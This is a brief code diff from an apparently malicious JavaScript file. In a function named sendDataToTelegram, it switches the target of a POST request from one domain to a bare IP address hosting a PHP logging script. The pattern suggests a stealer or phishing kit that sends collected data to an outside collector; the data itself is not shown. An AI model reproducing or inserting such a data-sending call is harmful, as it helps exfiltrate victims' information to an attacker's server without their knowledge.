@@ -66,7 +66,7 @@ async function sendDataToTelegram() {
     };
 
     try {
-        const response = await fetch('http://api.mobikapi.run.place/sergey/logapu.php', {
+        const response = await fetch('http://77.221.152.103/sergey/logapu.php', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
